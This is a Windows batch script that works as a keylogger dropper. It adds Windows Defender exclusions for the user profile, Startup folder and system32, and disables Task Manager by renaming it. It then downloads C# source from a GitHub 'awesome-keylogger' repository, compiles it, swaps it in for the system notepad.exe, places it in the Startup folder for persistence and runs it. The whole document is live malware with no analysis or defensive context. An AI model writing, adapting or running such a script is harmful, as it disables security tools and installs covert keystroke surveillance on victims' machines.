@echo off
powershell Add-MpPreference -ExclusionPath %userprofile%
powershell Add-MpPreference -ExclusionPath %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell Add-MpPreference -ExclusionPath c:\windows\system32\
ren c:\windows\system32\taskmgr.exe taskmgr.exe.TROJANNED
cd %userprofile%
curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/WinBoot.cs
c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe WinBoot.cs
erase WinBoot.cs
ren c:\windows\system32\notepad.exe notepad.exe.TROJANNED
copy notepad.exe c:\windows\system32\notepad.exe
copy notepad.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
%userprofile%\notepad.exe
